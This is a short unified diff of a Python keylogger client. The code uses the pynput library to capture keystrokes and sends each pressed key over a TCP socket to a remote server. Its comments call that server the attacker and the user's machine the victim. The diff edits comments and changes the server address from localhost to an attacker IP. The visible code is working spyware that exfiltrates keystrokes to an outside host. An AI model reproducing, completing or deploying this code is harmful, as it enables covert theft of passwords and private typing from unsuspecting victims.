@@ -1,12 +1,11 @@
-from pynput import keyboard
-# pynput libray is used to monitor the keyboard events and can be used for mouse events also
+from pynput import keyboard                     # pynput libray is used to monitor the keyboard events and can be used for mouse events also
 
-import socket
-# socket library is used to establish the connection between the client(victim) and server(attacker)
+import socket                                   # socket library is used to establish the connection between the client(victim) and server(attacker)
 
-server_address=('localhost',8000) # change ip address of server in place of localhost
+server_address=('192.1.1.1',8000)               # change ip address of server/attacker
 
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
+                                                
 # AF_INET for ipv4 and SOCK_STREAM for TCP connection (SOCK_DGRAM for UDP connection)
 
 client_socket.connect(server_address)
@@ -24,7 +23,7 @@ def release(key):
     else:                                       # else send the key pressed to the attacker
         try:
             message=str(key.char)
-        except AttributeError:
+        except AttributeError:                  # AttributeError is raised when the key pressed is a special character or symbol
             message=str(key)
         client_socket.sendall(message.encode('utf-8'))  # send the key pressed to the attacker in utf-8 (encoded) format
        
